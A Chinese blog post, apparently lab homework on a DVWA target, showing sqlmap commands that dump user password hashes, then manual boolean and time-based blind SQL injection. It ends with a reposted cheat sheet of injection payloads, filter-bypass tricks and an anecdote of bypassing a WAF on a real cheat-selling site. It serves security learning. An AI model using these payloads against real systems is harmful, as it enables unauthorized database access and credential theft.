<p><img src="/img/loading.gif" class="lazyload" data-src="/images/%E6%BC%8F%E6%B5%8B%E4%BD%9C%E4%B8%9A/%E6%BC%8F%E6%B5%8B%E4%BD%9C%E4%B8%9A%E5%8D%81%E4%BA%8C/image-20200609115156541.png"  alt="image-20200609115156541"></p>
<p>将sessid赋给cookie，传给浏览器</p>
<h5 id="使用sqlmap-1"><a href="#使用sqlmap-1" class="headerlink" title="使用sqlmap"></a>使用sqlmap</h5><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">"http://192.168.89.145/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#"</span> --cookie <span class="string">"security=low; PHPSESSID=vprbcjsqmv3uoad7an8ofdmpq3; acopendivids=swingset,jotto,phpbb2,redmine; acgroupswithpersist=nada"</span></span><br></pre></td></tr></table></figure>

<p><img src="/img/loading.gif" class="lazyload" data-src="/images/%E6%BC%8F%E6%B5%8B%E4%BD%9C%E4%B8%9A/%E6%BC%8F%E6%B5%8B%E4%BD%9C%E4%B8%9A%E5%8D%81%E4%BA%8C/image-20200609115940523.png"  alt="image-20200609115940523"></p>
<p>列举数据库</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">"http://192.168.89.145/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#"</span> --cookie <span class="string">"security=low; PHPSESSID=vprbcjsqmv3uoad7an8ofdmpq3; acopendivids=swingset,jotto,phpbb2,redmine; acgroupswithpersist=nada"</span> --dbs</span><br></pre></td></tr></table></figure>

<img src="/img/loading.gif" class="lazyload" data-src="/images/漏测作业/漏测作业十二/image-20200609120230837.png"  alt="image-20200609120230837" style="zoom:67%;">

<p>列举表</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">"http://192.168.89.145/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#"</span> --cookie <span class="string">"security=low; PHPSESSID=vprbcjsqmv3uoad7an8ofdmpq3; acopendivids=swingset,jotto,phpbb2,redmine; acgroupswithpersist=nada"</span> --tables -D dvwa</span><br></pre></td></tr></table></figure>

<img src="/img/loading.gif" class="lazyload" data-src="/images/漏测作业/漏测作业十二/image-20200609120353705.png"  alt="image-20200609120353705" style="zoom:80%;">

<p>列举列</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">"http://192.168.89.145/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#"</span> --cookie <span class="string">"security=low; PHPSESSID=vprbcjsqmv3uoad7an8ofdmpq3; acopendivids=swingset,jotto,phpbb2,redmine; acgroupswithpersist=nada"</span> --columns -T users -D dvwa</span><br></pre></td></tr></table></figure>

<p><img src="/img/loading.gif" class="lazyload" data-src="/images/漏测作业/漏测作业十二/image-20200609120507408.png"  alt="image-20200609120507408" style="zoom:67%;">看到有password</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">"http://192.168.89.145/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#"</span> --cookie <span class="string">"security=low; PHPSESSID=vprbcjsqmv3uoad7an8ofdmpq3; acopendivids=swingset,jotto,phpbb2,redmine; acgroupswithpersist=nada"</span> --dump -C <span class="string">"user,password"</span> columns -T users -D dvwa</span><br></pre></td></tr></table></figure>

<p>得到了加密后的密码</p>
<img src="/img/loading.gif" class="lazyload" data-src="/images/漏测作业/漏测作业十二/image-20200609120745316.png"  alt="image-20200609120745316" style="zoom:80%;">

<p>进行字典攻击</p>
<img src="/img/loading.gif" class="lazyload" data-src="/images/漏测作业/漏测作业十二/image-20200609121010789.png"  alt="image-20200609121010789" style="zoom:67%;">

<p>攻击成功</p>
<h3 id="手工盲注"><a href="#手工盲注" class="headerlink" title="手工盲注"></a>手工盲注</h3><img src="/img/loading.gif" class="lazyload" data-src="/images/漏测作业/漏测作业十二/image-20200611203943034.png"  alt="image-20200611203943034" style="zoom:67%;">

<h4 id="判断是否存在注入，注入是字符型还是数字型"><a href="#判断是否存在注入，注入是字符型还是数字型" class="headerlink" title="判断是否存在注入，注入是字符型还是数字型"></a>判断是否存在注入，注入是字符型还是数字型</h4><p>输入1</p>
<p>显示想用用户存在</p>
<img src="/img/loading.gif" class="lazyload" data-src="/images/漏测作业/漏测作业十二/image-20200611204044753.png"  alt="image-20200611204044753" style="zoom:67%;">

<p>输入1’ and 1=1 # </p>
<p>单引号为了闭合原来的SQL语句中的第一个单引号，后面的#为了闭合后面的单引号，运行后显示存在</p>
<img src="/img/loading.gif" class="lazyload" data-src="/images/漏测作业/漏测作业十二/image-20200611204227707.png"  alt="image-20200611204227707" style="zoom:67%;">

<p>输入1‘ and 1=2 #</p>
<p>显示不存在</p>
<img src="/img/loading.gif" class="lazyload" data-src="/images/漏测作业/漏测作业十二/image-20200611204413166.png"  alt="image-20200611204413166" style="zoom:67%;">

<p>输入1 and 1=2</p>
<p>因为mysql对于数值型字段的输入如果有非字符，则只取前面的有效部分，所以也能输出</p>
<img src="/img/loading.gif" class="lazyload" data-src="/images/漏测作业/漏测作业十二/image-20200611210706261.png"  alt="image-20200611210706261" style="zoom:67%;">

<h4 id="猜解当前数据库名"><a href="#猜解当前数据库名" class="headerlink" title="猜解当前数据库名"></a>猜解当前数据库名</h4><h5 id="长度"><a href="#长度" class="headerlink" title="长度"></a>长度</h5><p>输入1’ and length(database())=1 # </p>
<p><img src="/img/loading.gif" class="lazyload" data-src="/images/%E6%BC%8F%E6%B5%8B%E4%BD%9C%E4%B8%9A/%E6%BC%8F%E6%B5%8B%E4%BD%9C%E4%B8%9A%E5%8D%81%E4%BA%8C/image-20200611205754892.png"  alt="image-20200611205754892"></p>
<p>输入1’ and length(database())=2 # </p>
<p><img src="/img/loading.gif" class="lazyload" data-src="/images/%E6%BC%8F%E6%B5%8B%E4%BD%9C%E4%B8%9A/%E6%BC%8F%E6%B5%8B%E4%BD%9C%E4%B8%9A%E5%8D%81%E4%BA%8C/image-20200611205754892.png"  alt="image-20200611205754892"></p>
<p>输入1’ and length(database())=3 # </p>
<p><img src="/img/loading.gif" class="lazyload" data-src="/images/%E6%BC%8F%E6%B5%8B%E4%BD%9C%E4%B8%9A/%E6%BC%8F%E6%B5%8B%E4%BD%9C%E4%B8%9A%E5%8D%81%E4%BA%8C/image-20200611205758611.png"  alt="image-20200611205758611"></p>
<p>输入1’ and length(database())=4 # </p>
<p>有返回值，说明数据库名为4位</p>
<img src="/img/loading.gif" class="lazyload" data-src="/images/漏测作业/漏测作业十二/image-20200611205948776.png"  alt="image-20200611205948776" style="zoom:67%;">

<h5 id="具体字符"><a href="#具体字符" class="headerlink" title="具体字符"></a>具体字符</h5><p>输入1’ and ascii(substr(database(),1,1))&gt;97 #</p>
<img src="/img/loading.gif" class="lazyload" data-src="/images/漏测作业/漏测作业十二/image-20200611210751025.png"  alt="image-20200611210751025" style="zoom:67%;">

<p>输入1’ and ascii(substr(database(),1,1))&lt;122 #</p>
<img src="/img/loading.gif" class="lazyload" data-src="/images/漏测作业/漏测作业十二/image-20200611210827790.png"  alt="image-20200611210827790" style="zoom:67%;">

<p>输入1’ and ascii(substr(database(),1,1))&lt;109 #</p>
<img src="/img/loading.gif" class="lazyload" data-src="/images/漏测作业/漏测作业十二/image-20200611210847450.png"  alt="image-20200611210847450" style="zoom:67%;">

<p>输入1’ and ascii(substr(database(),1,1))&lt;103 #</p>
<img src="/img/loading.gif" class="lazyload" data-src="/images/漏测作业/漏测作业十二/image-20200611210911350.png"  alt="image-20200611210911350" style="zoom:67%;">

<p>输入1’ and ascii(substr(database(),1,1))&lt;100 #</p>
<img src="/img/loading.gif" class="lazyload" data-src="/images/漏测作业/漏测作业十二/image-20200611210932554.png"  alt="image-20200611210932554" style="zoom:67%;">

<p>输入1’ and ascii(substr(database(),1,1))&gt;100 #</p>
<img src="/img/loading.gif" class="lazyload" data-src="/images/漏测作业/漏测作业十二/image-20200611211048203.png"  alt="image-20200611211048203" style="zoom:67%;">

<p>说明第一个字符ascii=100，所以是‘d’</p>
<p>第二个字符ascii=118，所以是’v‘</p>
<img src="/img/loading.gif" class="lazyload" data-src="/images/漏测作业/漏测作业十二/image-20200611211512062.png"  alt="image-20200611211512062" style="zoom:67%;">

<p>第三个字符ascii=100，所以是‘w’</p>
<img src="/img/loading.gif" class="lazyload" data-src="/images/漏测作业/漏测作业十二/image-20200611212111429.png"  alt="image-20200611212111429" style="zoom:67%;">

<p>第四个字符ascii=97，所以是’a‘</p>
<img src="/img/loading.gif" class="lazyload" data-src="/images/漏测作业/漏测作业十二/image-20200611211734950.png"  alt="image-20200611211734950" style="zoom:67%;">



<p>数据库名’dvwa‘</p>
<h4 id="猜解数据库中的表名"><a href="#猜解数据库中的表名" class="headerlink" title="猜解数据库中的表名"></a>猜解数据库中的表名</h4><h5 id="猜解数据库中表的数量"><a href="#猜解数据库中表的数量" class="headerlink" title="猜解数据库中表的数量"></a>猜解数据库中表的数量</h5><p>输入1’ and (select count(table_name) from information_schema.tables where table_schema=database())=1 # </p>
<img src="/img/loading.gif" class="lazyload" data-src="/images/漏测作业/漏测作业十二/image-20200611212655336.png"  alt="image-20200611212655336" style="zoom:67%;">

<p>输入1’ and (select count(table_name) from information_schema.tables where table_schema=database())=2 # </p>
<img src="/img/loading.gif" class="lazyload" data-src="/images/漏测作业/漏测作业十二/image-20200611212742594.png"  alt="image-20200611212742594" style="zoom:67%;">

<p>说明数据库中有两个表</p>
<h5 id="猜表名长度"><a href="#猜表名长度" class="headerlink" title="猜表名长度"></a>猜表名长度</h5><p>输入 1’ and length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=1 #</p>
<img src="/img/loading.gif" class="lazyload" data-src="/images/漏测作业/漏测作业十二/image-20200611212655336.png"  alt="image-20200611212655336" style="zoom:67%;">

<p>输入 1’ and length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=1 #</p>
<img src="/img/loading.gif" class="lazyload" data-src="/images/漏测作业/漏测作业十二/image-20200611213106462.png"  alt="image-20200611213106462" style="zoom:67%;">

<p>说明第一个表名长度为9</p>
<h5 id="二分猜表名"><a href="#二分猜表名" class="headerlink" title="二分猜表名"></a>二分猜表名</h5><p>输入 1’ and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;97 # </p>
<p>存在</p>
<p>输入 1’ and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&lt;122 #</p>
<p>存在</p>
<p>输入  1’ and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=103 #</p>
<p>存在</p>
<img src="/img/loading.gif" class="lazyload" data-src="/images/漏测作业/漏测作业十二/image-20200611214209154.png"  alt="image-20200611214209154" style="zoom:67%;">

<p>说明第一个字母为’g’</p>
<p>第二个字母为117’u’</p>
<p>1’ and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),2,1))=117 #</p>
<p>第三个字母为101‘e’</p>
<p>1’ and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),3,1))=101# </p>
<h4 id="猜解表中字段名"><a href="#猜解表中字段名" class="headerlink" title="猜解表中字段名"></a>猜解表中字段名</h4><p>输入 1’ and (select count(column_name) from information_schema.columns where table_name=’users’)=6 #</p>
<p>显示存在，说明users表中有六个字段，==注：和书中不同==</p>
<img src="/img/loading.gif" class="lazyload" data-src="/images/漏测作业/漏测作业十二/image-20200611220812815.png"  alt="image-20200611220812815" style="zoom:67%;">

<h4 id="猜解字段名"><a href="#猜解字段名" class="headerlink" title="猜解字段名"></a>猜解字段名</h4><p>输入 1’ and length(substr((select column_name from information_schema.columns where table_name=’users’ limit 0,1),1))=1 #<br>不存在<br>输入 1’ and length(substr((select column_name from information_schema.columns where table_name=’users’ limit 0,1),1))=7 #<br>存在</p>
<img src="/img/loading.gif" class="lazyload" data-src="/images/漏测作业/漏测作业十二/image-20200611221624536.png"  alt="image-20200611221624536" style="zoom:67%;">

<p>说明users表的第一个字段为7个字符长度</p>
<h5 id="猜解所有字段名"><a href="#猜解所有字段名" class="headerlink" title="猜解所有字段名"></a>猜解所有字段名</h5><p>输入1’ and (select ascii(substr(column_name,1,1)) from information_schema.columns where table_name=”users” limit 1,1)=102#<br>存在</p>
<img src="/img/loading.gif" class="lazyload" data-src="/images/漏测作业/漏测作业十二/image-20200611225149155.png"  alt="image-20200611225149155" style="zoom:67%;">

<h4 id="猜解表中数据"><a href="#猜解表中数据" class="headerlink" title="猜解表中数据"></a>猜解表中数据</h4><p>输入1’ and (select ascii(substr(user,1,1)) from users limit 1,1)&gt;1 #</p>
<img src="/img/loading.gif" class="lazyload" data-src="/images/漏测作业/漏测作业十二/image-20200611225736407.png"  alt="image-20200611225736407" style="zoom:67%;">

<h3 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h3><h4 id="判断是否存在注入"><a href="#判断是否存在注入" class="headerlink" title="判断是否存在注入"></a>判断是否存在注入</h4><p>输入1’ and sleep(5),页面感到明显延迟</p>
<p>输入1 and sleep(5),没有延迟</p>
<h4 id="猜解当前数据库名字的长度"><a href="#猜解当前数据库名字的长度" class="headerlink" title="猜解当前数据库名字的长度"></a>猜解当前数据库名字的长度</h4><p>1’ and if(length(database())=1,sleep(5),1)#，没有延迟<br>1’ and if(length(database())=4,sleep(5),1)#，有延迟</p>
<h4 id="采用二分法猜解数据库名"><a href="#采用二分法猜解数据库名" class="headerlink" title="采用二分法猜解数据库名"></a>采用二分法猜解数据库名</h4><p>1’ and if(ascii(substr(database(),1,1))&gt;97,sleep(5),1)# 明显延迟</p>
<h1 id="总结（转）"><a href="#总结（转）" class="headerlink" title="总结（转）"></a>总结（转）</h1><blockquote>
<p>看到了一篇不错的总结:<a href="https://www.cnblogs.com/kyx599/articles/12345471.html" target="_blank" rel="noopener">https://www.cnblogs.com/kyx599/articles/12345471.html</a></p>
<p>以下为转载内容</p>
</blockquote>
<p><a href="https://www.cnblogs.com/kyx599/" target="_blank" rel="noopener"><img src="/img/loading.gif" class="lazyload" data-src="/images/%E6%BC%8F%E6%B5%8B%E4%BD%9C%E4%B8%9A/%E6%BC%8F%E6%B5%8B%E4%BD%9C%E4%B8%9A%E5%8D%81%E4%BA%8C/logo-1591886641448.gif"  alt="返回主页"></a></p>
<h2 id="sql盲注-：布尔注入及时间注入（合天网安学习整理）"><a href="#sql盲注-：布尔注入及时间注入（合天网安学习整理）" class="headerlink" title="sql盲注 ：布尔注入及时间注入（合天网安学习整理）"></a><a href="https://www.cnblogs.com/kyx599/articles/12345471.html" target="_blank" rel="noopener">sql盲注 ：布尔注入及时间注入（合天网安学习整理）</a></h2><h3 id="盲注："><a href="#盲注：" class="headerlink" title="盲注：#"></a>盲注：<a href="https://www.cnblogs.com/kyx599/articles/12345471.html#4056854671" target="_blank" rel="noopener">#</a></h3><p>盲注其实是sql注入的一种，之所以称为盲注是因为他不会根据你sql注入的攻击语句返回你想要知道的错误信息。<br>盲注分为两类：<br>　　1.布尔盲注　布尔很明显Ture跟Fales，也就是说它只会根据你的注入信息返回Ture跟Fales，也就没有了之前的报错信息。<br>　　2.时间盲注　界面返回值只有一种,true 无论输入任何值 返回情况都会按正常的来处理。加入特定的时间函数，通过查看web页面返回的时间差来判断注入的语句是否正确。</p>
<h3 id="基于布尔的盲注"><a href="#基于布尔的盲注" class="headerlink" title="基于布尔的盲注#"></a>基于布尔的盲注<a href="https://www.cnblogs.com/kyx599/articles/12345471.html#3031881891" target="_blank" rel="noopener">#</a></h3><p>在页面中，如果正确执行了SQL语句，则返回一种页面，如果SQL语句执行错误，则执行另一种页面。基于两种页面，来判断SQL语句正确与否，达到获取数据的目的</p>
<p>注意比如 ‘ ” 的注释通常用 –+ 或者 –%20 或者#来注释</p>
<p>注意闭合相关的语句比如 ）’ “等</p>
<p>用limit的原因是由于在页面显示的数据不够所有来限制其输出，然后通过limit中数字的变化来把所有的数据求出来</p>
<p>注意语法语言的不同会导致注释的不同，所有注释符要注意变通</p>
<h4 id="Payload"><a href="#Payload" class="headerlink" title="Payload#"></a>Payload<a href="https://www.cnblogs.com/kyx599/articles/12345471.html#3909603987" target="_blank" rel="noopener">#</a></h4><p>网上的payload一般是利用ascii()、substr()、length()结合进行利用</p>
<ul>
<li>获取数据库长度</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">and (select length(database()))&#x3D;长度  #可以通过大于等于等来进行猜测以下同理</span><br><span class="line">#database 数据库</span><br></pre></td></tr></table></figure>

<ul>
<li>逐字猜解数据库名</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">and (select ascii(substr(database(),位数,1)))&#x3D;ascii码  #位数的变化及从1，2，3变化即可通过ascii码以及猜解的数据库长度求出数据库的库名</span><br></pre></td></tr></table></figure>

<ul>
<li>猜解表名数量</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">and (select count(table_name) from information_schema.tables where table_schema&#x3D;database())&#x3D;数量 </span><br><span class="line"># information_schema.tables 专门用来储存所以表，5.0以上版本才有</span><br></pre></td></tr></table></figure>

<ul>
<li>猜解某个表长度</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">and (select length(table_name) from information_schema.tables where table_schema&#x3D;database() limit n,1)&#x3D;长度 #同理n从0来表示变化的表来求该库下的对应的表的长度</span><br></pre></td></tr></table></figure>

<ul>
<li>逐位猜解表名</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">and (select ascii(substr(table_name,1,1)) from information_schema.tables </span><br><span class="line">where table_schema &#x3D; database() limit n,1)&#x3D;ascii码 #从前面的1变化是求表名，而n变化是对应的库中的表</span><br></pre></td></tr></table></figure>

<ul>
<li>猜解列名数量</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">and (select count(*) from information_schema.columns where table_schema &#x3D;</span><br><span class="line"> database() and table_name &#x3D; 表名)&#x3D;数量#information_schema.columns 专门用来存储所有的列</span><br></pre></td></tr></table></figure>

<ul>
<li>猜解某个列长度</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">and (select length(column_name) from information_schema.columns where table_name&#x3D;&quot;表名&quot; limit n,1)&#x3D;长度</span><br></pre></td></tr></table></figure>

<ul>
<li>逐位猜解列名</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">and (select ascii(substr(column_name,位数,1)) from information_schema.columns where table_name&#x3D;&quot;表名&quot; limit n,1)&#x3D;ascii码</span><br></pre></td></tr></table></figure>

<ul>
<li>判断数据的数量</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">and (select count(列名) from 表名)&#x3D;数量</span><br></pre></td></tr></table></figure>

<ul>
<li>猜解某条数据的长度</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">and (select length(列名) from 表名 limit n,1)&#x3D;长度</span><br></pre></td></tr></table></figure>

<ul>
<li>逐位猜解数据</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">and (select ascii(substr(user,位数,1)) from 表名 limit n,1)&#x3D;ascii码</span><br></pre></td></tr></table></figure>

<h4 id="盲注tips"><a href="#盲注tips" class="headerlink" title="盲注tips#"></a>盲注tips<a href="https://www.cnblogs.com/kyx599/articles/12345471.html#1686626183" target="_blank" rel="noopener">#</a></h4><h5 id="过滤了substr函数怎么办"><a href="#过滤了substr函数怎么办" class="headerlink" title="过滤了substr函数怎么办#"></a>过滤了substr函数怎么办<a href="https://www.cnblogs.com/kyx599/articles/12345471.html#3695052890" target="_blank" rel="noopener">#</a></h5><p>用如下函数</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">left(str,index) 从左边第index开始截取  </span><br><span class="line">right(str,index) 从右边第index开始截取  </span><br><span class="line">substring(str,index) 从左边index开始截取    </span><br><span class="line">mid(str,index,ken) 截取str 从index开始,截取len的长度  </span><br><span class="line">lpad(str,len,padstr) rpad(str,len,padstr) 在str的左(右)两边填充给定的padstr到指定的长度len,返回填充的结果</span><br></pre></td></tr></table></figure>

<h5 id="过滤了等于号怎么办？"><a href="#过滤了等于号怎么办？" class="headerlink" title="过滤了等于号怎么办？#"></a>过滤了等于号怎么办？<a href="https://www.cnblogs.com/kyx599/articles/12345471.html#357692725" target="_blank" rel="noopener">#</a></h5><p>1、用in()</p>
<p><a href="https://sqlmap.wiki/images/QQ截图20191119103421.png" target="_blank" rel="noopener"><img src="/img/loading.gif" class="lazyload" data-src="https://sqlmap.wiki/images/QQ%E6%88%AA%E5%9B%BE20191119103421.png"  alt="img"></a></p>
<p>2、用like</p>
<p><a href="https://sqlmap.wiki/images/QQ截图20191119103614.png" target="_blank" rel="noopener"><img src="/img/loading.gif" class="lazyload" data-src="https://sqlmap.wiki/images/QQ%E6%88%AA%E5%9B%BE20191119103614.png"  alt="img"></a></p>
<h5 id="过滤了ascii-怎么办？"><a href="#过滤了ascii-怎么办？" class="headerlink" title="过滤了ascii()怎么办？#"></a>过滤了ascii()怎么办？<a href="https://www.cnblogs.com/kyx599/articles/12345471.html#2931224127" target="_blank" rel="noopener">#</a></h5><p>hex() bin() ord()</p>
<h5 id="过滤了字段名怎么办？"><a href="#过滤了字段名怎么办？" class="headerlink" title="过滤了字段名怎么办？#"></a>过滤了字段名怎么办？<a href="https://www.cnblogs.com/kyx599/articles/12345471.html#716717756" target="_blank" rel="noopener">#</a></h5><p>1、order by 盲注</p>
<p>条件：有回显，给出字段结构</p>
<p>order by用于根据指定的列对结果集进行排序。一般上是从0-9a-z这样排序，不区分大小写。先看下id为1的查询结果</p>
<p><a href="https://sqlmap.wiki/images/QQ截图20191119100631.png" target="_blank" rel="noopener"><img src="/img/loading.gif" class="lazyload" data-src="https://sqlmap.wiki/images/QQ%E6%88%AA%E5%9B%BE20191119100631.png"  alt="img"></a></p>
<p>执行如下payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select * from users where id&#x3D;1 union select 1,&#39;d&#39;,3 order by 2</span><br></pre></td></tr></table></figure>

<p><a href="https://sqlmap.wiki/images/QQ截图20191119100952.png" target="_blank" rel="noopener"><img src="/img/loading.gif" class="lazyload" data-src="https://sqlmap.wiki/images/QQ%E6%88%AA%E5%9B%BE20191119100952.png"  alt="img"></a>发现我们联合查询的数据d排在前面<br>再执行如下payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select * from users where id&#x3D;1 union select 1,&#39;z&#39;,3 order by 2</span><br></pre></td></tr></table></figure>

<p><a href="https://sqlmap.wiki/images/QQ截图20191119101219.png" target="_blank" rel="noopener"><img src="/img/loading.gif" class="lazyload" data-src="https://sqlmap.wiki/images/QQ%E6%88%AA%E5%9B%BE20191119101219.png"  alt="img"></a>发现联合查询的数据z排在后面了。这是什么意思呢？第一次联合查询的d，排在前面，是因为id为1的数据第一位是d，所以排在前面了。而id为1的数据第一位不是z，所以z就排在后面了，我们可以利用这个特性来进行布尔盲注，只要猜0-9，a-z，逐字猜解就好</p>
<p>2、子查询</p>
<p>这个东西没啥好解释的，直接看payload吧</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select * from users where id&#x3D;-1 union select 1,2,x.2 from (select * from (select 1)a,(select 2)b,(select 3)c union select * from users)x</span><br></pre></td></tr></table></figure>

<p><a href="https://sqlmap.wiki/images/QQ截图20191119102810.png" target="_blank" rel="noopener"><img src="/img/loading.gif" class="lazyload" data-src="https://sqlmap.wiki/images/QQ%E6%88%AA%E5%9B%BE20191119102810.png"  alt="img"></a></p>
<h4 id="实例演示"><a href="#实例演示" class="headerlink" title="实例演示#"></a>实例演示<a href="https://www.cnblogs.com/kyx599/articles/12345471.html#2714209021" target="_blank" rel="noopener">#</a></h4><p>一个卖吃鸡外挂的网站</p>
<p><a href="https://sqlmap.wiki/images/QQ截图20191119104843.png" target="_blank" rel="noopener"><img src="/img/loading.gif" class="lazyload" data-src="https://sqlmap.wiki/images/QQ%E6%88%AA%E5%9B%BE20191119104843.png"  alt="img" style="zoom: 33%;"></a>,</p>
<p>创建订单那存在SQL注入，利用上面常规payload获取到数据库名了，数据库名为chiji，进行到获取表数量就开始拦截了。<a href="https://sqlmap.wiki/images/QQ截图20191119105346.png" target="_blank" rel="noopener"><img src="/img/loading.gif" class="lazyload" data-src="https://sqlmap.wiki/images/QQ%E6%88%AA%E5%9B%BE20191119105346.png"  alt="img"></a>发现是360主机卫士拦截了，本来想按照bypass老哥发的文章进行绕过的，发现各种方法都不行，可能是站长修改了规则。自己测试，发现select 1不拦截。select 1 from不拦截。select 1 from 1拦截。所以我们要破坏select from的结构才能进行绕过。后来询问@撕夜师傅发现去掉from前面的空格即可绕过。后面的步骤参考上面的payload即可</p>
<h3 id="基于时间的盲注"><a href="#基于时间的盲注" class="headerlink" title="基于时间的盲注#"></a>基于时间的盲注<a href="https://www.cnblogs.com/kyx599/articles/12345471.html#1818048925" target="_blank" rel="noopener">#</a></h3><p>布尔盲注是根据页面正常否进行注入，而时间盲注则是通过SQL语句查询的时间来进行注入,一般是在页面无回显，无报错的情况下使用</p>
<p>可以通过F12来看其页面回显的时间与布尔盲注是一样的</p>
<ul>
<li>猜解数据库长度</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">and if((select length(database()))&#x3D;长度,sleep(6),0)</span><br></pre></td></tr></table></figure>

<ul>
<li>猜解数据库名</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">and if((select ascii(substr(database(),位数,1))&#x3D;ascii码),sleep(6),0)</span><br></pre></td></tr></table></figure>

<ul>
<li>判断表名的数量</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">and if((select count(table_name) from information_schema.tables where table_schema&#x3D;database())&#x3D;个数,sleep(6),0)</span><br></pre></td></tr></table></figure>

<ul>
<li>判断某个表名的长度</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">and if((select length(table_name) from information_schema.tables where table_schema&#x3D;database() limit n,1)&#x3D;长度,sleep(6),0)</span><br></pre></td></tr></table></figure>

<ul>
<li>逐位猜表名</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">and if((select ascii(substr(table_name,位数,1)) from information_schema.tables where table_schema&#x3D;database() limit n,1)&#x3D;ascii码,sleep(6),0)</span><br></pre></td></tr></table></figure>

<ul>
<li>判断列名数量</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">and if((select count(column_name) from information_schema.columns where table_name&#x3D;&quot;表名&quot;)&#x3D;个数,sleep(6),0)</span><br></pre></td></tr></table></figure>

<ul>
<li>判断某个列名的长度</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">and if((select length(column_name) from information_schema.columns where table_name&#x3D;&quot;表名&quot; limit n,1)&#x3D;长度,sleep(6),0)</span><br></pre></td></tr></table></figure>

<ul>
<li>逐位猜列名</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">and if((select ascii(substr(column_name,位数,1)) from information_schema.columns where table_name&#x3D;&quot;表名&quot; limit n,1)&#x3D;ascii码,sleep(6),0)</span><br></pre></td></tr></table></figure>

<ul>
<li>判断数据的数量</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">and if((select count(列名) from 表名)&#x3D;个数,sleep(6),0)</span><br></pre></td></tr></table></figure>

<ul>
<li>判断某个数据的长度</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">and if((select length(列名) from 表名)&#x3D;长度,sleep(6),0)</span><br></pre></td></tr></table></figure>

<ul>
<li>逐位猜数据</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">and if((select ascii(substr(列名,n,1)) from 表名)&#x3D;ascii码,sleep(6),0)</span><br></pre></td></tr></table></figure>

<h4 id="时间盲注小tips"><a href="#时间盲注小tips" class="headerlink" title="时间盲注小tips#"></a>时间盲注小tips<a href="https://www.cnblogs.com/kyx599/articles/12345471.html#1717403186" target="_blank" rel="noopener">#</a></h4><p>如果过滤了sleep，还可以用benchmark()，这个函数第一个值填要执行的次数，第二个填写要执行的表达式</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select * from users where id&#x3D;1 and if(ascii(substring((database()),1,1))&gt;1,(select benchmark(10000000,md5(0x41))),1)</span><br></pre></td></tr></table></figure>

<p><a href="https://sqlmap.wiki/images/QQ截图20191119212315.png" target="_blank" rel="noopener"><img src="/img/loading.gif" class="lazyload" data-src="https://sqlmap.wiki/images/QQ%E6%88%AA%E5%9B%BE20191119212315.png"  alt="img"></a></p>
<h3 id="转载文章"><a href="#转载文章" class="headerlink" title="转载文章#"></a>转载文章<a href="https://www.cnblogs.com/kyx599/articles/12345471.html#2402399172" target="_blank" rel="noopener">#</a></h3><p><a href="https://sqlmap.wiki/post/sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%E4%B9%8B%E7%9B%B2%E6%B3%A8/" target="_blank" rel="noopener">https://sqlmap.wiki/post/sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%E4%B9%8B%E7%9B%B2%E6%B3%A8/</a></p>
<p><a href="https://www.jianshu.com/p/65f05e7cc957" target="_blank" rel="noopener">https://www.jianshu.com/p/65f05e7cc957</a></p>
<p>作者：delusion</p>
<p>出处：<a href="https://www.cnblogs.com/kyx599/articles/12345471.html" target="_blank" rel="noopener">https://www.cnblogs.com/kyx599/articles/12345471.html</a></p>
